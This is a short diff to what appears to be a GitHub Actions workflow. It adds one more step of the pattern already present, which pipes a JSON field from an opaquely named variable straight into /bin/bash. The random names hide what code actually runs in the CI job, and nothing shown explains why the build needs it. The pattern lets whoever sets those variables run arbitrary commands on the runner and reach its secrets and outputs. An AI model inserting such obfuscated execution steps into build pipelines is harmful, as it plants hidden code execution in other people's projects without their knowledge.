@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$l95818" | jq -r .erms7 | /bin/bash
           echo $lluk9 | jq -r .zx08 | /bin/bash
           printf '%s' "$idms26970" | jq -r .nz96464 | /bin/bash
+          printf '%s' "$ywlb01230" | jq -r .wz1 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
